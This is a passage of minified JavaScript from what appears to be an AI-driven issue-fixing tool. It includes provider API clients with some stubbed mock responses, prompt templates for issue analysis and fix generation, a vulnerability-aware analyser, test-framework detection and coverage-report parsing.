J=X;J=J.replace(/https?:\/\/api\.[a-zA-Z0-9.-]+\.(com|ai|dev|io)(\/[a-zA-Z0-9/\-._~:/?#[\]@!$&'()*+,;=]*)?/gi,"API endpoint"),J=J.replace(/\b(sk-proj-|sk-|ant_|key[:\s]+)[a-zA-Z0-9_\-]{8,}/gi,"API credential"),J=J.replace(/\b(api[_-]?key|token|secret|credential)([:\s]+)[a-zA-Z0-9_\-]{8,}/gi,"$1$2[REDACTED]"),J=J.replace(/\b[A-Z][A-Z0-9_]*_API_KEY\b/g,"API_KEY"),J=J.replace(/\b(claude-[0-9a-z\-\.]+|gpt-[0-9a-z\-\.]+|text-davinci-[0-9]+)\b/gi,"AI model");let Y=new RegExp(`\\b(${["anthropic","claude","openai","gpt","mistral","ollama","gemini","bard"].join("|")})\\b`,"gi");if(J=J.replace(Y,"AI provider"),J.includes("Failed to connect to"))J=J.replace(/Failed to connect to .+ API/g,"Failed to connect to AI provider API");return J=J.replace(/\/v\d+\/[a-zA-Z]+/g,"/api/endpoint"),J=J.replace(/\/chat\/completions/g,"/api/endpoint"),J=J.replace(/\s+/g," ").trim(),J=J.replace(/AI provider provider/gi,"AI provider"),J=J.replace(/API credential credential/gi,"API credential"),J}async function QX(X){let J=null;if(X.useVendedCredentials)try{let Q=process.env.RSOLV_API_KEY;if(!Q)throw new Error("RSOLV_API_KEY environment variable not set for vended credentials");q.info("Getting credential manager singleton for vended credentials"),J=await H2.getInstance(Q),q.info("Credential manager singleton retrieved successfully")}catch(Q){throw q.error("Failed to get credential manager singleton",Q),Q}switch(X.provider.toLowerCase()){case"openai":return new nA(X,J);case"anthropic":case"claude-code":return new aA(X,J);case"mistral":return new sA(X,J);case"ollama":return new oA(X,J);default:throw new Error(`Unsupported AI provider: ${X.provider}`)}}class nA{config;credentialManager;constructor(X,J){if(this.config=X,this.credentialManager=J,!X.useVendedCredentials&&!X.apiKey)throw new Error("AI provider API key is required")}async complete(X,J={}){try{return q.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.makeApiCall(X,J)}catch(Q){throw q.error("AI provider API error",Q),new Error(z8(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async makeApiCall(X,J){try{let Q=this.config.baseUrl||"https://api.openai.com/v1",Y=J.model||this.config.model||"gpt-4",W=J.temperature??this.config.temperature??0.2,z=J.maxTokens??this.config.maxTokens??2000,G={model:Y,messages:[{role:"user",content:X}],temperature:W,max_tokens:z,top_p:J.topP??1,frequency_penalty:J.frequencyPenalty??0,presence_penalty:J.presencePenalty??0},H;try{H=this.config.useVendedCredentials?await this.credentialManager?.getCredential("openai"):this.config.apiKey}catch(B){throw new Error("Failed to retrieve API key")}if(!H)throw new Error("Failed to retrieve API key");let U=await fetch(`${Q}/chat/completions`,{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${H}`},body:JSON.stringify(G)});if(!U.ok){let B=await U.json().catch(()=>({}));throw new Error(z8(`AI provider error (${U.status}): ${B.error?.message||U.statusText}`))}let K=await U.json(),V=K.choices[0]?.message?.content||"";if(this.config.useVendedCredentials&&this.credentialManager){let B=K.usage?.total_tokens||0;await this.credentialManager.reportUsage("openai",{tokensUsed:B,requestCount:1})}return V}catch(Q){throw q.error("Error calling AI provider API",Q),Q}}getMockResponse(X){return`Analysis of the issue:

This appears to be a bug in the authentication system where token validation is failing for valid tokens that contain special characters. The issue is likely in the token parsing logic.

Files to modify:
- \`src/auth/tokenValidator.js\`
- \`src/utils/stringEscaping.js\`

Suggested Approach:
The token validator is not properly handling URL-encoded characters. We need to update the validation function to properly decode tokens before validation, and ensure that special characters are correctly handled throughout the authentication flow.`}}class aA{config;credentialManager;constructor(X,J){if(this.config=X,this.credentialManager=J,!X.useVendedCredentials&&!X.apiKey)throw new Error("AI provider API key is required")}async complete(X,J={}){try{return q.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.makeApiCall(X,J)}catch(Q){throw q.error("AI provider API error",Q),new Error(z8(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async makeApiCall(X,J){try{let Q=this.config.baseUrl||"https://api.anthropic.com",Y=J.model||this.config.model||"claude-3-sonnet-20240229",W=J.temperature??this.config.temperature??0.2,z=J.maxTokens??this.config.maxTokens??2000,G={model:Y,messages:[{role:"user",content:X}],temperature:W,max_tokens:z,top_p:J.topP??1},H;try{if(this.config.useVendedCredentials){if(q.debug(`Attempting to get vended credential - credentialManager exists: ${!!this.credentialManager}`),!this.credentialManager)throw new Error("Credential manager not initialized for vended credentials");H=await this.credentialManager.getCredential("anthropic")}else H=this.config.apiKey}catch(B){throw q.error("Failed to get API key",{useVended:this.config.useVendedCredentials,hasCredentialManager:!!this.credentialManager,error:B instanceof Error?B.message:String(B)}),new Error(`Failed to retrieve API key: ${B instanceof Error?B.message:String(B)}`)}if(!H)throw new Error("Failed to retrieve API key - key is empty");let U=await fetch(`${Q}/v1/messages`,{method:"POST",headers:{"Content-Type":"application/json","X-API-Key":H,"anthropic-version":"2023-06-01"},body:JSON.stringify(G)});if(!U.ok){let B=await U.json().catch(()=>({}));throw new Error(z8(`AI provider error (${U.status}): ${B.error?.message||U.statusText}`))}let K=await U.json(),V=K.content?.[0]?.text||"";if(this.config.useVendedCredentials&&this.credentialManager){let B=K.usage?.total_tokens||0;await this.credentialManager.reportUsage("anthropic",{tokensUsed:B,requestCount:1})}return V}catch(Q){throw q.error("Error calling AI provider API",Q),Q}}getMockResponse(X){return`Based on my analysis, this is a performance issue in the data processing pipeline.

The main bottleneck appears to be in the file processing function that's not properly streaming large files, leading to excessive memory usage.

Files that need modification:
- \`src/services/fileProcessor.js\`
- \`src/utils/streamHandler.js\`

This is a medium complexity issue that will require implementing proper stream processing instead of loading the entire file into memory. The fix should significantly reduce memory usage and improve processing speed.`}}class sA{config;credentialManager;constructor(X,J){if(this.config=X,this.credentialManager=J,!X.useVendedCredentials&&!X.apiKey)throw new Error("AI provider API key is required")}async complete(X,J={}){try{return q.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.simulateApiCall(X,J)}catch(Q){throw q.error("AI provider API error",Q),new Error(z8(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async simulateApiCall(X,J){return await new Promise((Q)=>setTimeout(Q,550)),`This is a documentation issue where the installation instructions are unclear for Windows users.

The documentation needs to be updated to include Windows-specific commands and requirements.

Files to modify:
- \`docs/installation.md\`
- \`README.md\`

This is a simple fix that involves adding a new section for Windows installation instructions, including how to set up the environment variables correctly and handle path differences.`}}class oA{config;credentialManager;constructor(X,J){this.config=X,this.credentialManager=J}async complete(X,J={}){try{return q.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.simulateApiCall(X,J)}catch(Q){throw q.error("AI provider API error",Q),new Error(z8(`AI provider error: ${Q instanceof Error?Q.message:String(Q)}`))}}async simulateApiCall(X,J){return await new Promise((Q)=>setTimeout(Q,1000)),`I've analyzed the feature request for adding pagination to the API endpoints.

This is a medium complexity task that will require modifying multiple files:
- \`src/controllers/userController.js\`
- \`src/services/queryService.js\`
- \`src/middleware/pagination.js\` (new file needed)

The approach should be to create a reusable pagination middleware that can be applied to all list endpoints. This will require updating the query service to support limit and offset parameters, and updating the controllers to use the new middleware.`}}var JQ=j1(()=>{t1();dX()});function tA(X){return`I need you to analyze the following software issue and provide a technical assessment.

Issue Title: ${X.title}

Issue Description:
${X.body}

Repository: ${X.repository.fullName}
Primary Language: ${X.repository.language||"Unknown"}

Please provide:
1. A determination of what type of issue this is (bug, feature request, refactoring, etc.)
2. Which files are likely to need modification
3. An estimate of the complexity (simple, medium, complex)
4. A suggested approach to solve the issue

Focus on technical details and be specific about the implementation approach. If the issue description lacks critical information, note what additional context would be needed.`}function eA(X,J,Q){let Y=`I need you to generate a solution for the following software issue:

Issue Title: ${X.title}

Issue Description:
${X.body}

Repository: ${X.repository.fullName}
Primary Language: ${X.repository.language||"Unknown"}

Based on my analysis, this is a ${J.issueType} issue with ${J.estimatedComplexity} complexity.

The suggested approach is: ${J.suggestedApproach}

I need you to generate specific code changes to resolve this issue. Here are the relevant files with their current content:
`;for(let[W,z]of Object.entries(Q))Y+=`
--- ${W} ---
\`\`\`
${z}
\`\`\`
`;return Y+=`
IMPORTANT: Format your response EXACTLY as shown below for proper parsing:

CRITICAL: You MUST modify EXISTING files only. DO NOT create new files. Make changes in-place to fix the vulnerability.

For each file that needs to be modified, use one of these formats:

Option 1 (preferred):
filename.ext:
\`\`\`language
[complete file content]
\`\`\`

Option 2:
--- filename.ext ---
\`\`\`language
[complete file content]
\`\`\`

Example:
src/auth/login.js:
\`\`\`javascript
function authenticateUser(username, password) {
  // secure implementation here
}
\`\`\`

CRITICAL: The parser requires EXACT formatting. Use one of the above formats or the solution will fail.

After all file changes, add:
1. Brief explanation of changes
2. How this fixes the issue
3. Any assumptions made

Provide complete, working code following existing patterns.`,Y}function XN(X,J,Q){let Y=Object.keys(Q).join(", ");return`I need you to generate a clear, professional pull request description for the following changes.

Issue: ${X.title} (#${X.number})

Issue Type: ${J.issueType}
Complexity: ${J.estimatedComplexity}

Files modified: ${Y}

Approach taken: ${J.suggestedApproach}

Please generate a pull request description with:
1. A clear, concise title that summarizes the change
2. A detailed description explaining what was changed and why
3. Any testing instructions or considerations for reviewers
4. References to the original issue

Keep the tone professional but friendly, and focus on the technical details that would be relevant to code reviewers.`}function JN(X){switch(X){case"bug":return"For this bug fix, focus on identifying the root cause first before implementing a solution. Consider edge cases and ensure your fix doesn't introduce regressions. Include tests that verify the fix works as expected.";case"feature":return"For this feature implementation, ensure the solution is well-integrated with the existing architecture. Consider backward compatibility, error handling, and appropriate documentation. Include tests for the new functionality.";case"refactoring":return"For this refactoring task, maintain identical functionality while improving the code structure. Focus on readability, maintainability, and adherence to design principles. Ensure tests pass before and after your changes.";case"performance":return"For this performance improvement, focus on identifying bottlenecks and optimizing critical paths. Consider time and space complexity, and measure before/after metrics where possible. Be careful not to sacrifice code readability for marginal gains.";case"security":return"For this security issue, approach with extra caution. Ensure the fix addresses the root vulnerability completely without introducing new attack vectors. Consider all possible exploit scenarios and follow security best practices.";case"documentation":return"For this documentation task, focus on clarity, completeness, and accuracy. Ensure examples are working and up-to-date. Consider both beginner and advanced users, and follow any documentation style guidelines present in the project.";case"dependency":return"For this dependency update, carefully check for breaking changes and necessary adjustments to the codebase. Update any affected tests and documentation. Consider whether the update brings security fixes that should be highlighted.";case"test":return"For this testing task, ensure comprehensive coverage of edge cases and typical usage patterns. Follow existing testing patterns and naming conventions. Consider both unit and integration tests as appropriate for the code being tested.";default:return"For this task, ensure your solution is well-integrated with the existing codebase and follows the project's coding conventions. Include appropriate error handling, documentation, and tests."}}var YN={};Y9(YN,{analyzeIssue:()=>X6});async function X6(X,J,Q){if(q.info(`Analyzing issue #${X.number} with AI`),process.env.RSOLV_DEV_MODE==="true"&&process.env.RSOLV_USE_CLAUDE_MAX==="true"&&!Q)return q.info("Development mode with Claude Max - using simplified analysis"),{issueType:QN(X),filesToModify:$x1(X),estimatedComplexity:"medium",requiredContext:[],suggestedApproach:"Fix security vulnerability using Claude Code Max",confidenceScore:0.8,canBeFixed:!0};let W=Q||await QX(J.aiProvider),z=tA(X);try{let G=await W.complete(z,{temperature:J.aiProvider.temperature||0.2,maxTokens:J.aiProvider.maxTokens||2000,model:J.aiProvider.model});return q.debug("AI analysis response received",{response:G}),Ex1(G,X)}catch(G){throw q.error("Error analyzing issue with AI",G),new Error(`AI analysis failed: ${G instanceof Error?G.message:String(G)}`)}}function Ex1(X,J){try{q.info(`AI analysis response for issue #${J.number}:`,X.substring(0,500));let Q=QN(J),Y=[],W="medium",z=/`([\w\-./]+\.[\w]+)`|"([\w\-./]+\.[\w]+)"|'([\w\-./]+\.[\w]+)'|([\w\-./]*\/[\w\-./]*\.(?:js|ts|py|java|rb|php|go|rs|cpp|c|h))/g,G;while((G=z.exec(X))!==null){let V=G[1]||G[2]||G[3]||G[4];if(V&&!Y.includes(V))Y.push(V)}let H=["login.js","auth.js","login.ts","auth.ts","authentication.js","authentication.ts","security.js","security.ts"];for(let V of H)if(X.toLowerCase().includes(V.toLowerCase())&&!Y.includes(V))Y.push(V);if(X.toLowerCase().includes("simple")||X.toLowerCase().includes("straightforward"))W="simple";else if(X.toLowerCase().includes("complex")||X.toLowerCase().includes("challenging"))W="complex";let U="",K=["Suggested Approach:","Approach:","Solution:","Fix:","Recommendation:","To fix this"];for(let V of K)if(X.includes(V)){if(U=X.split(V)[1]?.split(`

`)[0]?.trim()||"",U)break}if(!U&&X.length>50)if(X.length>500)U=X.trim();else U=X.split(`

`).filter((B)=>B.trim().length>20)[0]?.trim()||"";return q.info(`Parsed analysis for issue #${J.number}:`,{filesToModify:Y,suggestedApproach:U.substring(0,100),canBeFixed:Y.length>0&&U.length>0}),{issueType:Q,filesToModify:Y,estimatedComplexity:W,requiredContext:[],suggestedApproach:U,confidenceScore:0.7,canBeFixed:(Y.length>0||U.length>50)&&U.length>0}}catch(Q){return q.error("Error parsing AI analysis response",Q),{issueType:"other",filesToModify:[],estimatedComplexity:"medium",requiredContext:[],suggestedApproach:"Unable to determine approach from AI analysis.",canBeFixed:!1}}}function $x1(X){let J=[],Q=/####\s*`([^`]+)`/g,Y;while((Y=Q.exec(X.body))!==null)J.push(Y[1]);return J}function QN(X){let J=X.title.toLowerCase(),Q=X.body.toLowerCase(),Y=`${J} ${Q}`;for(let W of X.labels){if(W.toLowerCase().includes("bug"))return"bug";if(W.toLowerCase().includes("feature"))return"feature";if(W.toLowerCase().includes("refactor"))return"refactoring";if(W.toLowerCase().includes("performance"))return"performance";if(W.toLowerCase().includes("security"))return"security";if(W.toLowerCase().includes("documentation"))return"documentation";if(W.toLowerCase().includes("dependency"))return"dependency";if(W.toLowerCase().includes("test"))return"test"}if(Y.includes("fix")||Y.includes("bug")||Y.includes("issue")||Y.includes("crash")||Y.includes("error"))return"bug";else if(Y.includes("add")||Y.includes("new")||Y.includes("feature")||Y.includes("implement"))return"feature";else if(Y.includes("refactor")||Y.includes("clean")||Y.includes("improve code"))return"refactoring";else if(Y.includes("performance")||Y.includes("slow")||Y.includes("optimize")||Y.includes("speed"))return"performance";else if(Y.includes("secur")||Y.includes("vulnerab")||Y.includes("hack")||Y.includes("attack"))return"security";else if(Y.includes("document")||Y.includes("readme")||Y.includes("wiki")||Y.includes("comment"))return"documentation";else if(Y.includes("dependency")||Y.includes("upgrade")||Y.includes("update")||Y.includes("package"))return"dependency";else if(Y.includes("test")||Y.includes("spec")||Y.includes("unit test")||Y.includes("coverage"))return"test";return"other"}var G7=j1(()=>{t1();JQ()});var WN=j1(()=>{XQ();V5();gY();IX();XQ()});class QQ{securityDetector;constructor(){let X=CX();this.securityDetector=new JX(X)}async analyzeWithSecurity(X,J,Q,Y){q.info(`Analyzing issue #${X.number} with security-aware analysis`);let W=await this.performStandardAnalysis(X,J,Y),z;if(Q&&Q.size>0){if(z=await this.performSecurityAnalysis(Q,X),z.hasSecurityIssues)W.issueType="security",W.estimatedComplexity=this.adjustComplexityForSecurity(W.estimatedComplexity,z.riskLevel)}return{...W,securityAnalysis:z}}async performSecurityAnalysis(X,J){q.info("=== SECURITY ANALYSIS v2.0 ACTIVE ==="),q.info(`Performing security analysis on ${X.size} codebase files`);let Q=[],Y=[];for(let[H,U]of X.entries()){let K=this.getLanguageFromPath(H);if(!K){q.debug(`Skipping file ${H} - unable to determine language`);continue}let V=await this.securityDetector.detect(U,K,H);if(V.length>0){let B=V.map((Z)=>({...Z,file:H}));Q.push(...B),Y.push(H),q.info(`Found ${V.length} vulnerabilities in ${H}`)}}let W=this.calculateRiskLevel(Q),z=this.generateSecurityRecommendations(Q),G={total:Q.length,byType:{},bySeverity:{}};return Q.forEach((H)=>{G.byType[H.type]=(G.byType[H.type]||0)+1,G.bySeverity[H.severity]=(G.bySeverity[H.severity]||0)+1}),{hasSecurityIssues:Q.length>0,vulnerabilities:Q,riskLevel:W,recommendations:z,affectedFiles:Y,summary:G}}getLanguageFromPath(X){switch(X.split(".").pop()?.toLowerCase()){case"js":case"jsx":return"javascript";case"ts":case"tsx":return"typescript";case"py":return"python";case"rb":return"ruby";case"php":return"php";case"java":return"java";case"rs":return"rust";case"ex":case"exs":return"elixir";default:return null}}calculateRiskLevel(X){if(X.length===0)return"low";let J=X.filter((W)=>W.severity==="critical").length,Q=X.filter((W)=>W.severity==="high").length,Y=X.filter((W)=>W.severity==="medium").length;if(J>0)return"critical";if(Q>=3)return"critical";if(Q>=1)return"high";if(Y>=3)return"high";if(Y>=1)return"medium";return"low"}generateSecurityRecommendations(X){let J=new Set;for(let Q of X){if(Q.remediation)J.add(Q.remediation);switch(Q.type){case"sql_injection":J.add("Implement parameterized queries throughout the codebase"),J.add("Add input validation and sanitization");break;case"xss":J.add("Use secure DOM manipulation methods (textContent, not innerHTML)"),J.add("Implement Content Security Policy (CSP)");break;default:J.add("Review security best practices for this vulnerability type")}}return Array.from(J)}adjustComplexityForSecurity(X,J){if(J==="critical")return"complex";if(J==="high"&&X==="simple")return"medium";if(J==="high"&&X==="medium")return"complex";return X}async performStandardAnalysis(X,J,Q){let{analyzeIssue:Y}=await Promise.resolve().then(() => (G7(),YN));return await Y(X,J,Q)}determineIssueType(X){let J=X.title.toLowerCase(),Q=X.body.toLowerCase(),Y=`${J} ${Q}`;if(Y.includes("secur")||Y.includes("vulnerab")||Y.includes("hack")||Y.includes("attack")||Y.includes("xss")||Y.includes("sql injection"))return"security";if(Y.includes("fix")||Y.includes("bug"))return"bug";else if(Y.includes("add")||Y.includes("feature"))return"feature";else if(Y.includes("refactor"))return"refactoring";else if(Y.includes("performance"))return"performance";return"other"}}var uz=j1(()=>{t1();WN();XQ();V5()});import*as H8 from"fs";import*as z7 from"path";class cz{async detectFromPackageJson(X){if(!X)return{detected:!1,frameworks:[]};let J=[],Q={...X.dependencies,...X.devDependencies};for(let[Y,W]of Object.entries(kx1))for(let z of W.patterns){let G=Object.keys(Q).find((H)=>H.includes(z));if(G){let H=Q[G],U=this.detectVersionType(H),K={name:Y,version:H,type:W.type,confidence:1,detectionMethod:"package",versionType:U};if("companions"in W&&W.companions){let V=W.companions.filter((B)=>Object.keys(Q).some((Z)=>Z.includes(B)));if(V.length>0)K.companions=V}J.push(K);break}}return{detected:J.length>0,frameworks:J}}async detectFromRequirements(X){if(!X)return{detected:!1,frameworks:[]};let J=[],Q=X.split(`
`);for(let[Y,W]of Object.entries(bx1))if("patterns"in W&&W.patterns)for(let z of W.patterns){let G=Q.find((H)=>H.startsWith(z));if(G){let H=G.includes("==")?G.split("==")[1].trim():"unknown",U={name:Y,version:H,type:W.type,confidence:1,detectionMethod:"package"};if("plugins"in W&&W.plugins){let K=W.plugins.filter((V)=>Q.some((B)=>B.startsWith(V)));if(K.length>0)U.plugins=K}J.push(U);break}}return{detected:J.length>0,frameworks:J}}async detectFromGemfile(X){if(!X)return{detected:!1,frameworks:[]};let J=[],Q=X.split(`
`);for(let[Y,W]of Object.entries(vx1))for(let z of W.patterns){let G=Q.find((H)=>H.includes(`gem '${z}`)||H.includes(`gem "${z}`));if(G){let H=G.match(/['"]([^'"]+)['"]\s*,\s*['"]([^'"]+)['"]/),U=H?H[2]:"unknown",K={name:Y,version:U,type:W.type,confidence:1,detectionMethod:"package"};if("variants"in W&&W.variants){let V=W.variants.find((B)=>Q.some((Z)=>Z.includes(`gem '${B}'`)||Z.includes(`gem "${B}"`)));if(V)K.variant=V}J.push(K);break}}return{detected:J.length>0,frameworks:J}}async detectFromSourceCode(X,J){let Q=[];if(J==="python"){if(X.includes("import unittest")||X.includes("from unittest"))Q.push({name:"unittest",version:"builtin",type:"unit",confidence:0.9,detectionMethod:"import"})}return{detected:Q.length>0,frameworks:Q}}async detectFromFilePatterns(X){let J=[];if(X.some((W)=>W.includes(".test.")||W.includes(".spec.")||W.includes("__tests__")))J.push({name:"jest",version:"unknown",type:"unit",confidence:0.7,detectionMethod:"file-pattern"});if(X.some((W)=>W.includes("_spec.rb")||W.includes("spec_helper.rb")||W.includes("/spec/")))J.push({name:"rspec",version:"unknown",type:"unit",confidence:0.8,detectionMethod:"file-pattern"});return{detected:J.length>0,frameworks:J}}async detectFromConfigFiles(X){let J=[];for(let Q of X)if(Q.includes("jest.config"))J.push({name:"jest",version:"unknown",type:"unit",confidence:0.95,configFile:Q,detectionMethod:"config"});else if(Q.includes("vitest.config"))J.push({name:"vitest",version:"unknown",type:"unit",confidence:0.95,configFile:Q,detectionMethod:"config"});return{detected:J.length>0,frameworks:J}}async detectFrameworks(X){let J=[],Q=[],Y=[];try{let z=z7.join(X,"package.json");if(H8.existsSync(z)){let V=JSON.parse(H8.readFileSync(z,"utf-8")),B=await this.detectFromPackageJson(V);J.push(...B.frameworks)}let G=z7.join(X,"requirements.txt");if(H8.existsSync(G)){let V=H8.readFileSync(G,"utf-8"),B=await this.detectFromRequirements(V);J.push(...B.frameworks)}let H=z7.join(X,"Gemfile");if(H8.existsSync(H)){let V=H8.readFileSync(H,"utf-8"),B=await this.detectFromGemfile(V);J.push(...B.frameworks)}let U=["test","tests","__tests__","spec","specs"];for(let V of U){let B=z7.join(X,V);if(H8.existsSync(B)&&H8.statSync(B).isDirectory())Y.push(V)}Q.push("*.test.js","*.test.ts","*.spec.js","*.spec.ts","*_test.py","test_*.py","*_spec.rb","*.test.go");let K=z7.join(X,"bunfig.toml");if(H8.existsSync(K))J.push({name:"bun",version:"builtin",type:"unit",confidence:1,detectionMethod:"config",configFile:"bunfig.toml"})}catch(z){}let W=J.reduce((z,G)=>!z||G.confidence>z.confidence?G:z,null)||void 0;return{detected:J.length>0,primaryFramework:W,allFrameworks:J,testFilePatterns:Q,testDirectories:Y}}detectVersionType(X){if(X.startsWith("^"))return"caret";if(X.startsWith("~"))return"tilde";if(X.includes(">")||X.includes("<")||X.includes(" "))return"range";return"exact"}}var kx1,bx1,vx1;var GN=j1(()=>{kx1={jest:{type:"unit",patterns:["jest"]},vitest:{type:"unit",patterns:["vitest","@vitest/"]},mocha:{type:"unit",patterns:["mocha"],companions:["chai","sinon"]},jasmine:{type:"unit",patterns:["jasmine"]},cypress:{type:"e2e",patterns:["cypress"]},playwright:{type:"e2e",patterns:["@playwright/test","playwright"]},ava:{type:"unit",patterns:["ava"]},tape:{type:"unit",patterns:["tape"]},qunit:{type:"unit",patterns:["qunit"]},bun:{type:"unit",patterns:["bun:test"]},karma:{type:"unit",patterns:["karma"]},"testing-library":{type:"unit",patterns:["@testing-library/"]}},bx1={pytest:{type:"unit",patterns:["pytest"],plugins:["pytest-cov","pytest-mock"]},unittest:{type:"unit",builtin:!0},nose2:{type:"unit",patterns:["nose2"]},doctest:{type:"unit",builtin:!0},hypothesis:{type:"unit",patterns:["hypothesis"]}},vx1={rspec:{type:"unit",patterns:["rspec"],variants:["rspec-rails"]},minitest:{type:"unit",patterns:["minitest"]},"test-unit":{type:"unit",patterns:["test-unit"]},cucumber:{type:"bdd",patterns:["cucumber"]},capybara:{type:"e2e",patterns:["capybara"]}}});class lz{async parseLcov(X){try{let J=[],Q=X.split("end_of_record").filter((W)=>W.trim());for(let W of Q){let z=W.split(`
`).filter((H)=>H.trim()),G={functions:{total:0,covered:0,details:[]},lines:{total:0,covered:0,percentage:0,details:[]}};for(let H of z){let[U,...K]=H.split(":"),V=K.join(":");switch(U){case"SF":G.path=V;break;case"FN":let[B,Z]=V.split(",");G.functions.details.push({name:Z,line:parseInt(B),hits:0});break;case"FNF":G.functions.total=parseInt(V);break;case"FNH":G.functions.covered=parseInt(V);break;case"DA":let[M,F]=V.split(","),j=parseInt(M),O=parseInt(F);if(G.lines.details.push({line:j,hits:O}),O===0&&!G.lines.uncoveredLines)G.lines.uncoveredLines=[];if(O===0)G.lines.uncoveredLines.push(j);break;case"LF":G.lines.total=parseInt(V);break;case"LH":G.lines.covered=parseInt(V);break}}if(G.lines.total>0)G.lines.percentage=parseFloat((G.lines.covered/G.lines.total*100).toFixed(2));if(G.functions?.details){for(let H of G.functions.details){let U=G.lines.details.find((K)=>K.line===H.line);if(U)H.hits=U.hits}if(G.functions.total>0)G.functions.percentage=parseFloat((G.functions.covered/G.functions.total*100).toFixed(2))}if(G.path)J.push(G)}let Y=this.calculateSummary(J);return{format:"lcov",files:J,summary:Y}}catch(J){return{format:"lcov",files:[],error:`Failed to parse LCOV data: ${J}`,summary:{totalFiles:0,totalLines:0,coveredLines:0,linePercentage:0}}}}async parseCoveragePy(X){try{let J=JSON.parse(X),Q=[];for(let[Y,W]of Object.entries(J.files)){let z=W;Q.push({path:Y,lines:{total:z.summary.num_statements,covered:z.summary.covered_lines,percentage:z.summary.percent_covered,uncoveredLines:z.missing_lines}})}return{format:"coverage.py",files:Q,summary:{totalFiles:Q.length,totalLines:J.totals.num_statements,coveredLines:J.totals.covered_lines,linePercentage:J.totals.percent_covered}}}catch(J){return{format:"coverage.py",files:[],error:`Failed to parse coverage.py data: ${J}`}}}async parseCoveragePyXml(X){try{let J=[],Q=X.matchAll(/<class filename="([^"]+)"[^>]*>([\s\S]*?)<\/class>/g);for(let Y of Q){let W=Y[1],G=Y[2].matchAll(/<line number="(\d+)" hits="(\d+)"/g),H=[],U=[];for(let B of G){let Z=parseInt(B[1]),M=parseInt(B[2]);if(H.push({line:Z,hits:M}),M===0)U.push(Z)}let K=H.filter((B)=>B.hits>0).length,V=H.length;J.push({path:W,lines:{total:V,covered:K,percentage:V>0?parseFloat((K/V*100).toFixed(2)):0,details:H,uncoveredLines:U}})}return{format:"coverage.py-xml",files:J,summary:this.calculateSummary(J)}}catch(J){return{format:"coverage.py-xml",files:[],error:`Failed to parse coverage.py XML: ${J}`}}}async parseSimpleCov(X){try{let J=JSON.parse(X),Q=[],W=Object.values(J)[0].coverage;if(!W)throw new Error("Invalid SimpleCov format: missing coverage data");for(let[z,G]of Object.entries(W)){let H=G,U=H.lines||H,V=(Array.isArray(U)?U:[]).map((M,F)=>({line:F+1,hits:M})).filter((M)=>M.hits!==null),B=V.filter((M)=>M.hits>0),Z=V.filter((M)=>M.hits===0).map((M)=>M.line);Q.push({path:z,lines:{total:V.length,covered:B.length,percentage:V.length>0?parseFloat((B.length/V.length*100).toFixed(2)):0,uncoveredLines:Z}})}return{format:"simplecov",files:Q,summary:this.calculateSummary(Q)}}catch(J){return{format:"simplecov",files:[],error:`Failed to parse SimpleCov data: ${J}`}}}async findCoverageGaps(X){let J=[];for(let Q of X.files){if(Q.functions?.details){for(let Y of Q.functions.details)if(Y.hits===0)J.push({file:Q.path,type:"uncovered-function",name:Y.name,line:Y.line,priority:this.getPriority(Q.path,"function")})}if(Q.lines.uncoveredLines&&Q.lines.uncoveredLines.length>0){let Y=this.findUncoveredBlocks(Q.lines.uncoveredLines);for(let W of Y)J.push({file:Q.path,type:"uncovered-block",lines:W,priority:this.getPriority(Q.path,"block",W.length)});if(Q.lines.uncoveredLines.length>=5&&this.isSecurityFile(Q.path))J.push({file:Q.path,type:"uncovered-block",lines:Q.lines.uncoveredLines.slice(0,5),priority:"critical"})}if(Q.lines.percentage<50)J.push({file:Q.path,type:"low-coverage",coveragePercentage:Q.lines.percentage,priority:this.getPriority(Q.path,"file",void 0,Q.lines.percentage)})}return J}async findTestsForFile(X,J){let Q=this.getBaseName(X),Y=J.filter((W)=>{return this.getBaseName(W).includes(Q)||W.includes(X.replace(/\.[^.]+$/,""))});return{sourceFile:X,testFiles:Y,hasTests:Y.length>0}}async mapTestsToSource(X,J){let Q={};for(let Y of X)Q[Y]=await this.findTestsForFile(Y,J);return Q}async generateSummary(X){let J=X.files.filter((Y)=>Y.lines.percentage<80).map((Y)=>Y.path),Q=X.files.filter((Y)=>Y.lines.percentage>=80).map((Y)=>Y.path);return{overallCoverage:X.summary?.linePercentage||0,filesCovered:X.files.length,linesOfCode:X.summary?.totalLines||0,linesCovered:X.summary?.coveredLines||0,functionsCovered:X.summary?.coveredFunctions,totalFunctions:X.summary?.totalFunctions,needsImprovement:J,wellCovered:Q}}async recommendTestPriorities(X){let J=[],Q=[...X].sort((W,z)=>{let G={critical:0,high:1,medium:2,low:3};return G[W.priority]-G[z.priority]}),Y=1;for(let W of Q){let z=this.getRecommendationReason(W),G=this.getSuggestedTests(W);J.push({priority:Y++,file:W.file,reason:z,suggestedTests:G,coverageGap:W})}return J}async getTestGenerationContext(X,J){let Q=X.files.find((z)=>z.path===J);if(!Q)throw new Error(`File ${J} not found in coverage report`);let Y=Q.functions?.details?.filter((z)=>z.hits===0).map((z)=>z.name)||[],W=this.getPriority(J,"file",void 0,Q.lines.percentage);return{file:J,uncoveredFunctions:Y,uncoveredLines:Q.lines.uncoveredLines||[],coveragePercentage:Q.lines.percentage,priority:W,suggestedTestTypes:this.getSuggestedTestTypes(Q,W)}}calculateSummary(X){let J=0,Q=0,Y=0,W=0;for(let z of X)if(J+=z.lines.total,Q+=z.lines.covered,z.functions)Y+=z.functions.total,W+=z.functions.covered;return{totalFiles:X.length,totalLines:J,coveredLines:Q,linePercentage:J>0?parseFloat((Q/J*100).toFixed(2)):0,totalFunctions:Y||void 0,coveredFunctions:W||void 0,functionPercentage:Y>0?parseFloat((W/Y*100).toFixed(2)):void 0}}findUncoveredBlocks(X){if(X.length===0)return[];let J=[],Q=[X[0]];for(let Y=1;Y<X.length;Y++)if(X[Y]===X[Y-1]+1)Q.push(X[Y]);else{if(Q.length>=1)J.push([...Q]);Q=[X[Y]]}if(Q.length>=1)J.push(Q);return J}getPriority(X,J,Q,Y){if(this.isSecurityFile(X)){if(J==="file")return"critical";if(J==="function"&&Y===0)return"critical";return 